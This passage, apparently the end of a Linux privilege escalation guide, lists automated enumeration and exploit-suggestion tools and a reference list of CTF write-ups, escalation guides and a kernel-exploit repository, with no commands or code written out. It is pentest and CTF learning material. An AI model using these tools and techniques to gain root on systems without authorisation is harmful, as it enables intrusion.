**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
